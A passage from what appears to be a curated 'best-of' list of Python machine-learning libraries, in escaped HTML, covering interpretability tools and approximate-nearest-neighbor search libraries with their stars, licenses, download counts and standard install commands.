(👨‍💻 10 · 🔀 94 · 📥 16 · 📦 7 · 📋 36 - 38% open · ⏱️ 18.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jalammar/ecco&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ecco&#34;&gt;PyPi&lt;/a&gt; (📥 290 / month · 📦 1 · ⏱️ 09.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ecco&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ecco&#34;&gt;Conda&lt;/a&gt; (📥 400 · ⏱️ 10.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ecco&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/albermax/innvestigate&#34;&gt;iNNvestigate&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 980 · 💤) - A toolbox to iNNvestigate neural networks predictions!. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/albermax/innvestigate&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 220 · 📋 240 - 29% open · ⏱️ 03.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/albermax/innvestigate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/innvestigate&#34;&gt;PyPi&lt;/a&gt; (📥 370 / month · 📦 1 · ⏱️ 14.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install innvestigate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/tcav&#34;&gt;tcav&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 520 · 💤) - Code for the TCAV ML interpretability project. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/tcav&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 130 · 📦 12 · 📋 61 - 11% open · ⏱️ 16.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/tcav&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tcav&#34;&gt;PyPi&lt;/a&gt; (📥 120 / month · 📦 3 · ⏱️ 23.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tcav&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/EthicalML/xai&#34;&gt;XAI&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 820 · 💤) - XAI - An eXplainability toolbox for machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/EthicalML/xai&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 3 · 🔀 120 · 📦 15 · 📋 9 - 22% open · ⏱️ 30.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/EthicalML/xai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/xai&#34;&gt;PyPi&lt;/a&gt; (📥 150 / month · 📦 6 · ⏱️ 30.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install xai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aerdem4/lofo-importance&#34;&gt;LOFO&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 470) - Leave One Feature Out Importance. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/aerdem4/lofo-importance&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 3 · 🔀 53 · 📦 19 · 📋 20 - 20% open · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/aerdem4/lofo-importance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lofo-importance&#34;&gt;PyPi&lt;/a&gt; (📥 480 / month · 📦 1 · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lofo-importance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/marcotcr/anchor&#34;&gt;Anchor&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 700) - Code for High-Precision Model-Agnostic Explanations paper. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/marcotcr/anchor&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 97 · 📋 70 - 27% open · ⏱️ 17.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/marcotcr/anchor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/anchor_exp&#34;&gt;PyPi&lt;/a&gt; (📥 1.2K / month · ⏱️ 26.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install anchor_exp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/interpretml/interpret-text&#34;&gt;interpret-text&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 320) - A library that incorporates state-of-the-art explainers for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/interpretml/interpret-text&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 57 · 📋 74 - 78% open · ⏱️ 06.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/interpretml/interpret-text&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/interpret-text&#34;&gt;PyPi&lt;/a&gt; (📥 100 / month · ⏱️ 07.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install interpret-text&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 17 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/TeamHG-Memex/eli5&#34;&gt;eli5&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.5K · 💀) - A library for debugging/inspecting machine learning classifiers and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bmabey/pyLDAvis&#34;&gt;pyLDAvis&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 1.6K · 💀) - Python library for interactive topic model visualization... &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/lucid&#34;&gt;Lucid&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 4.4K · 💀) - A collection of infrastructure and tools for research in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/reiinakano/scikit-plot&#34;&gt;scikit-plot&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 2.2K · 💀) - An intuitive library to add plotting functionality to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepchecks/deepchecks&#34;&gt;Deep Checks&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 1.5K) - Test Suites for Validating ML Models &amp;amp; Data. Deepchecks is a.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/raghakot/keras-vis&#34;&gt;keras-vis&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 2.9K · 💀) - Neural network visualization toolkit for keras. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ModelOriented/DALEX&#34;&gt;DALEX&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1K) - moDel Agnostic Language for Exploration and eXplanation. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/andosa/treeinterpreter&#34;&gt;TreeInterpreter&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 710 · 💀) - Package for interpreting scikit-learns decision tree.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/parrt/random-forest-importances&#34;&gt;random-forest-importances&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 500 · 💀) - Code to compute permutation and drop-column.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/oracle/Skater&#34;&gt;Skater&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1K) - Python Library for Model Interpretation/Explanations. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=UPL-1.0&#34;&gt;❗️UPL-1.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/fairness-indicators&#34;&gt;fairness-indicators&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 260) - Tensorflows Fairness Evaluation and Visualization.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/model-card-toolkit&#34;&gt;model-card-toolkit&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 280) - a tool that leverages rich metadata and lineage.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MisaOgura/flashtorch&#34;&gt;FlashTorch&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 670 · 💀) - Visualization toolkit for neural networks in PyTorch! Demo --. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/explainX/explainx&#34;&gt;ExplainX.ai&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 310 · 💀) - Explainable AI framework for data scientists. Explain &amp;amp; debug any.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SAP/contextual-ai&#34;&gt;contextual-ai&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 80) - Contextual AI adds explainability to different stages of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/suinleelab/attributionpriors&#34;&gt;Attribution Priors&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 98 · 💀) - Tools for training explainable models using.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/intuit/bias-detector&#34;&gt;bias-detector&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 37) - Bias Detector is a python package for detecting bias in machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Vector Similarity Search (ANN)&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for Approximate Nearest Neighbor Search and Vector Indexing/Similarity Search.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;🔗&amp;nbsp;&lt;b&gt;&lt;a href=&#34;https://github.com/erikbern/ann-benchmarks&#34;&gt;ANN Benchmarks&lt;/a&gt;&lt;/b&gt; ( ⭐ 2.9K) - Benchmarks of approximate nearest neighbor libraries in Python.&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/milvus-io/milvus&#34;&gt;Milvus&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 10K) - An open-source vector database for scalable similarity search and AI.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/milvus-io/milvus&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 210 · 🔀 1.5K · 📥 29K · 📋 5.1K - 5% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/milvus-io/milvus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pymilvus&#34;&gt;PyPi&lt;/a&gt; (📥 40K / month · 📦 16 · ⏱️ 02.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pymilvus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/milvusdb/milvus&#34;&gt;Docker Hub&lt;/a&gt; (📥 960K · ⭐ 18 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull milvusdb/milvus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/faiss&#34;&gt;Faiss&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 17K) - A library for efficient similarity search and clustering of dense vectors. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/faiss&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 98 · 🔀 2.6K · 📦 640 · 📋 1.8K - 9% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/faiss&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pymilvus&#34;&gt;PyPi&lt;/a&gt; (📥 40K / month · 📦 16 · ⏱️ 02.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pymilvus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/faiss&#34;&gt;Conda&lt;/a&gt; (📥 320K · ⏱️ 09.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge faiss&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/spotify/annoy&#34;&gt;Annoy&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 9.9K) - Approximate Nearest Neighbors in C++/Python optimized for memory usage.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/spotify/annoy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 81 · 🔀 1K · 📦 2.1K · 📋 340 - 10% open · ⏱️ 25.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/spotify/annoy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/annoy&#34;&gt;PyPi&lt;/a&gt; (📥 1.3M / month · 📦 240 · ⏱️ 18.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install annoy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/python-annoy&#34;&gt;Conda&lt;/a&gt; (📥 230K · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge python-annoy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nmslib/nmslib&#34;&gt;NMSLIB&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 2.8K) - Non-Metric Space Library (NMSLIB): An efficient similarity search.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nmslib/nmslib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 380 · 📦 610 · 📋 400 - 15% open · ⏱️ 19.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nmslib/nmslib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nmslib&#34;&gt;PyPi&lt;/a&gt; (📥 100K / month · 📦 47 · ⏱️ 03.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nmslib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nmslib&#34;&gt;Conda&lt;/a&gt; (📥 52K · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nmslib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nmslib/hnswlib&#34;&gt;hnswlib&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2K) - Header-only C++/python library for fast approximate nearest neighbors. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nmslib/hnswlib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 56 · 🔀 360 · 📦 240 · 📋 250 - 51% open · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nmslib/hnswlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hnswlib&#34;&gt;PyPi&lt;/a&gt; (📥 350K / month · 📦 24 · ⏱️ 14.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hnswlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hnswlib&#34;&gt;Conda&lt;/a&gt; (📥 40K · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hnswlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lmcinnes/pynndescent&#34;&gt;PyNNDescent&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 620) - A Python nearest neighbor descent for approximate nearest neighbors. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lmcinnes/pynndescent&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 85 · 📦 1.6K · 📋 100 - 48% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lmcinnes/pynndescent&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pynndescent&#34;&gt;PyPi&lt;/a&gt; (📥 2.8M / month · 📦 26 · ⏱️ 14.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pynndescent&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pynndescent&#34;&gt;Conda&lt;/a&gt; (📥 620K · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pynndescent&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/yahoojapan/NGT&#34;&gt;NGT&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 900) - Nearest Neighbor Search with Neighborhood Graph and Tree for High-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/yahoojapan/NGT&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 91 · 📋 100 - 14% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/yahoojapan/NGT&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ngt&#34;&gt;PyPi&lt;/a&gt; (📥 17K / month · 📦 8 